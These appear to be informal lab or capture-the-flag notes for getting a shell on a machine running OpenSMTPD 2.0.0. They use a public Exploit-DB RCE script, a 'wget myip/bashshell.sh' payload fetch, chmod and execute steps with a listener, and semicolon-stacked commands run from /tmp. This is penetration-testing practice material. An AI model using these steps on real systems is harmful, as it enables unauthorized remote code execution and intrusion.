if after running an nmap scan and you see smtp is open check the version. If it looks like this you might be able to get a foothold:

25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.218], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info


1.) searchsploit smtp
2.) /usr/share/exploitdb/exploits/linux/remote/47984.py pops up as an rce
3.) searchsploit -m /linux/remote/47984.py
	- -m mirrors the exploit and copies it into your current working directory
4.) start a python server and put a bashshell.sh file onto the server with the following command
5.) python3 smtpdrce.py 192.168.218.71 25 'wget myip/bashshell.sh'
6.) see if the python server got a get request
7.) if it did make sure to change the privs on this with the smtpdrce.py using 'chmod +x bashshell.sh'
8.) from there trying running it with './bashshell.sh' (these commands get entered after 25 in the rce.py)
9.) setup your listener on the port specified in the bashshell script before running actually
10.) run it again and you should gey a shell!!!

if this doesnt work but you got a get request from the python server you can try doing stacked remote command execution

to do this add a ; in between commmands.

e.g: python3 smtpdrce.py 192.168.218.71 25 'cd /tmp; wget myip/bashshell.sh'

the tmp directory might allow you to upload files with the user you are running the rce as

then do the same for the other commands and just add the cd /tmp; before them 

hopefully that works
